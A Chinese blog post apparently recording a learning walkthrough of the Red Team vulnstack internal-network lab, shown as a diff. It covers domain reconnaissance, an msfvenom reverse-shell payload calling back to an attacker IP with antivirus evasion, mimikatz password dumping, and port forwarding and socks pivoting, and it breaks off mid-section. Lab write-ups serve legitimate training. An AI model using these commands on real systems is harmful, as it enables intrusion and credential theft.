@@ -1,0 +1,920 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('Enter password') !== ''){
+                alert('Error！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网渗透,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言开始学习内网渗透，记录一下内网渗透流程，本次内网环境为红日安全提供的靶场：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/我直接就从拿到webshell开始内网渗透    系统信息收集以下收集的信息作为内网渗透中必不可少的组成部分，收集的信息不一定会用到，但作为整个内网渗透流程中的一个组成部分。    查询用户权限，获取SID123456who">
+<meta name="keywords" content="内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日内网靶场1渗透笔记">
+<meta property="og:url" content="http://yoursite.com/2020/04/14/红日内网靶场1渗透笔记/index.html">
+<meta property="og:site_name" content="故人梦">
+<meta property="og:description" content="前言开始学习内网渗透，记录一下内网渗透流程，本次内网环境为红日安全提供的靶场：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/我直接就从拿到webshell开始内网渗透    系统信息收集以下收集的信息作为内网渗透中必不可少的组成部分，收集的信息不一定会用到，但作为整个内网渗透流程中的一个组成部分。    查询用户权限，获取SID123456who">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://k-ring.github.io/img/nw1_1.png">
+<meta property="og:image" content="https://k-ring.github.io/img/nw1_2.png">
+<meta property="og:image" content="https://k-ring.github.io/img/nw1_3.png">
+<meta property="og:image" content="https://k-ring.github.io/img/nw1_4.png">
+<meta property="og:image" content="https://k-ring.github.io/img/nw1_5.png">
+<meta property="og:image" content="https://k-ring.github.io/img/nw1_6.png">
+<meta property="og:image" content="https://k-ring.github.io/img/nw1_7.png">
+<meta property="og:image" content="https://k-ring.github.io/img/nw1_8.png">
+<meta property="og:updated_time" content="2020-06-07T03:44:54.128Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="红日内网靶场1渗透笔记">
+<meta name="twitter:description" content="前言开始学习内网渗透，记录一下内网渗透流程，本次内网环境为红日安全提供的靶场：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/我直接就从拿到webshell开始内网渗透    系统信息收集以下收集的信息作为内网渗透中必不可少的组成部分，收集的信息不一定会用到，但作为整个内网渗透流程中的一个组成部分。    查询用户权限，获取SID123456who">
+<meta name="twitter:image" content="https://k-ring.github.io/img/nw1_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/14/红日内网靶场1渗透笔记/">
+
+
+
+
+
+  <title>红日内网靶场1渗透笔记 | 故人梦</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">故人梦</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">至今朝，忆往昔、</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resources">
+          <a href="/resources/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-modx"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/14/红日内网靶场1渗透笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="故人梦">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="故人梦">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">红日内网靶场1渗透笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-14T00:00:00+08:00">
+                2020-04-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,833 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  18 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>开始学习内网渗透，记录一下内网渗透流程，本次内网环境为红日安全提供的靶场：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>我直接就从拿到webshell开始内网渗透   </p>
+<h3 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h3><p>以下收集的信息作为内网渗透中必不可少的组成部分，收集的信息不一定会用到，但作为整个内网渗透流程中的一个组成部分。   </p>
+<p>查询用户权限，获取SID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用户名      SID                                           </span><br><span class="line">=========== ==============================================</span><br><span class="line">god\student S-1-5-21-2952760202-1353902439-2381784089-1109</span><br></pre></td></tr></table></figure></p>
+<p>查询指定用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user student /domain</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/nw1_1.png" alt>   </p>
+<p>查看本机网络配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接 4:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">   物理地址. . . . . . . . . . . . . : 00-0C-29-E9-E8-9D</span><br><span class="line">   DHCP 已启用 . . . . . . . . . . . : 否</span><br><span class="line">   自动配置已启用. . . . . . . . . . : 是</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.52.143(首选) </span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.52.2</span><br><span class="line">   DNS 服务器  . . . . . . . . . . . : 192.168.52.138</span><br><span class="line">                                       8.8.8.8</span><br><span class="line">   TCPIP 上的 NetBIOS  . . . . . . . : 已启用</span><br><span class="line">以太网适配器 本地连接:</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">   物理地址. . . . . . . . . . . . . : 00-0C-29-E9-E8-93</span><br><span class="line">   DHCP 已启用 . . . . . . . . . . . : 是</span><br><span class="line">   自动配置已启用. . . . . . . . . . : 是</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.0.101(首选) </span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   获得租约的时间  . . . . . . . . . : 2020年4月7日 10:16:12</span><br><span class="line">   租约过期的时间  . . . . . . . . . : 2020年4月7日 12:16:12</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.0.1</span><br><span class="line">   DHCP 服务器 . . . . . . . . . . . : 192.168.0.1</span><br><span class="line">   DNS 服务器  . . . . . . . . . . . : 192.168.1.1</span><br><span class="line">                                       192.168.0.1</span><br><span class="line">   TCPIP 上的 NetBIOS  . . . . . . . : 已启用</span><br></pre></td></tr></table></figure></p>
+<p>查询操作系统<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           STU1</span><br><span class="line">OS 名称:          Microsoft Windows 7 专业版 </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br></pre></td></tr></table></figure></p>
+<p>查看系统体系结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure></p>
+<p>查询进程列表并输出到txt文本，使用key师傅提供的杀软进程来匹配是否有杀软，项目地址：<a href="https://github.com/gh0stkey/avList" target="_blank" rel="noopener">https://github.com/gh0stkey/avList</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &gt; list.txt</span><br></pre></td></tr></table></figure></p>
+<p>查询本地用户及本地管理员<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">net user </span><br><span class="line"></span><br><span class="line">\\STU1 的用户帐户</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    liukaifeng01             </span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net localgroup administrators</span><br><span class="line"></span><br><span class="line">别名     administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line">成员</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">GOD\Domain Admins</span><br><span class="line">liukaifeng01</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure></p>
+<p>列出本地计算机与所连接的客户端之间的会话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure></p>
+<p>查询本机端口开放情况<br><a href="https://www.cnblogs.com/bmjoker/p/8833316.html" target="_blank" rel="noopener">黑客常用端口利用总结</a><br><a href="https://docs.ioin.in/writeup/blog.heysec.org/_archives_577/index.html" target="_blank" rel="noopener">端口渗透总结</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">//挑选部分常用端口</span><br><span class="line">协议  本地地址          外部地址        状态           PID</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4056</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       4068</span><br></pre></td></tr></table></figure></p>
+<p>查看系统补丁情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">或者</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn(推荐)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Caption                                     Description  HotFixID   InstalledOn  </span><br><span class="line">http://support.microsoft.com/?kbid=2534111  Hotfix       KB2534111  8/25/2019    </span><br><span class="line">http://support.microsoft.com/?kbid=2999226  Update       KB2999226  9/15/2019    </span><br><span class="line">http://support.microsoft.com                Update       KB958488   8/29/2019    </span><br><span class="line">http://support.microsoft.com/?kbid=976902   Update       KB976902   11/21/2010</span><br></pre></td></tr></table></figure></p>
+<p>查询共享列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br><span class="line">或</span><br><span class="line">wmic share get name,path,status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">C$           C:\                             默认共享                          </span><br><span class="line">IPC$                                         远程 IPC                          </span><br><span class="line">ADMIN$       C:\Windows                      远程管理                          </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure></p>
+<p>查询路由表发现内网其他ip段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure></p>
+<p>查看远程连接端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumber</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp</span><br><span class="line">    portnumber    REG_DWORD    0xd3d</span><br></pre></td></tr></table></figure></p>
+<p>开启远程连接服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure></p>
+<p>判断存在的域和域内成员<br>(这里可能是两个网卡的问题，使用net view没有显示本机)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br><span class="line">net view</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/nw1_2.png" alt>   </p>
+<p>查看域控制器组/域控制器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line">或者</span><br><span class="line">net time /domain</span><br><span class="line">nltest /dclist:god</span><br><span class="line">nslookup -type=srv _ldap._tcp</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/nw1_3.png" alt>   </p>
+<p>判断域管理员、查看域内主机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/nw1_4.png" alt></p>
+<p>获取域密码策略<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这项请求将在域 god.org 的域控制器处理。</span><br><span class="line">强制用户在时间到期之后多久必须注销?:     从不</span><br><span class="line">密码最短使用期限(天):                    1</span><br><span class="line">密码最长使用期限(天):                    42</span><br><span class="line">密码长度最小值:                          7</span><br><span class="line">保持的密码历史记录长度:                  24</span><br><span class="line">锁定阈值:                                从不</span><br><span class="line">锁定持续时间(分):                        30</span><br><span class="line">锁定观测窗口(分):                        30</span><br><span class="line">计算机角色:                              PRIMARY</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure></p>
+<p>探测域内存活主机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、使用NetBIOS快速探测</span><br><span class="line">上传nbt.exe，nbt.exe 192.168.52.0/24</span><br><span class="line"></span><br><span class="line">2、利用ICMP协议快速探测</span><br><span class="line">for /L %l in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%l | findstr &quot;TTL=&quot;</span><br><span class="line"></span><br><span class="line">3、meterpreter &gt; run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure></p>
+<p>扫描域内端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、S扫描器</span><br><span class="line"></span><br><span class="line">2、metasploit端口扫描</span><br><span class="line"></span><br><span class="line">3、PowerSploit的Invoke-portscan.ps1脚本</span><br><span class="line"></span><br><span class="line">4、等其他方式</span><br></pre></td></tr></table></figure></p>
+<h3 id="权限提升及内网信息收集"><a href="#权限提升及内网信息收集" class="headerlink" title="权限提升及内网信息收集"></a>权限提升及内网信息收集</h3><h4 id="会话转移至metasploit"><a href="#会话转移至metasploit" class="headerlink" title="会话转移至metasploit"></a>会话转移至metasploit</h4><p>msfvenom生成payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=9999 -e x86/shikata_ga_nai -i 5 PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o shell.exe</span><br></pre></td></tr></table></figure></p>
+<p><strong>当然这里根据情况要做免杀</strong></p>
+<p>然后将shell.exe通过shell上传到目标服务器上，在命令行上运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">metasploit:</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.0.104</span><br><span class="line">set lport 9999</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">shell:</span><br><span class="line">shell.exe</span><br></pre></td></tr></table></figure></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>因为用户同时也是本地管理员，获取到meterpreter会话之后，直接使用getsystem可直接进行提权至system</p>
+<h4 id="mimikatz获取账号密码或者hash"><a href="#mimikatz获取账号密码或者hash" class="headerlink" title="mimikatz获取账号密码或者hash"></a>mimikatz获取账号密码或者hash</h4><p>直接加载meterpreter中的mimikatz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">wdigest</span><br><span class="line"></span><br><span class="line">或者自己上传mimikatz程序</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p><strong>但是读取内存失败，不知道为什么，目标系统是win7 sp1，64位</strong><br>内存读取失败信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;1029203  Kerberos   GOD           student        mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō憄 ReadProcessMemory  WriteProcessMemory  n.a. (wdigest KO)</span><br></pre></td></tr></table></figure></p>
+<p>在github上下载最新版的mimikatz，上传，然后读取明文密码<br><strong>当然这里的mimikatz.exe程序需要做免杀处理</strong>    </p>
+<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><h4 id="portfwd实现端口转发"><a href="#portfwd实现端口转发" class="headerlink" title="portfwd实现端口转发"></a>portfwd实现端口转发</h4><p>将内网的某特定端口转发到公网的某一端口上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 7777 -r 192.168.52.143 -p 3389</span><br></pre></td></tr></table></figure></p>
+<p>将192.168.52.143这个内网ip的3389端口转发到公网这个ip的7777端口，mstsc连接<code>192.168.0.104:7777</code></p>
+<h4 id="pivot代理"><a href="#pivot代理" class="headerlink" title="pivot代理"></a>pivot代理</h4><p>上面的端口转发只能转发一个端口，而有时我们需要对内网进行扫描，或者直接进入内网，这时就需要一个代理。   </p>
+<p>在msf中添加到内网网段的路由<br>先让meterpreter会话在后台运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf5 exploit(multi/handler) &gt; route add 192.168.52.0/24 1</span><br><span class="line">(route add 内网ip段 子网掩码 session的ID)</span><br><span class="line">msf5 exploit(multi/handler) &gt; route print       //查看路由表(route flush   清空路由表)</span><br><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks5</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br><span class="line"></span><br><span class="line">//运行之后会在0.0.0.0上监听1080端口；然后在proxychains.conf中设置该代理即可访问内网</span><br></pre></td></tr></table></figure></p>
+<p><strong>注：socks代理只能代理tcp及上层的流量，底层流量不能代理，比如ICMP或者arp，需要好好学一下网络了，之前总是学了点就放弃了。</strong>    </p>
+<h4 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure>
+<p>发现三个存活的内网ip<br><img src="https://k-ring.github.io/img/nw1_5.png" alt><br>255那个ip不知道是什么   </p>
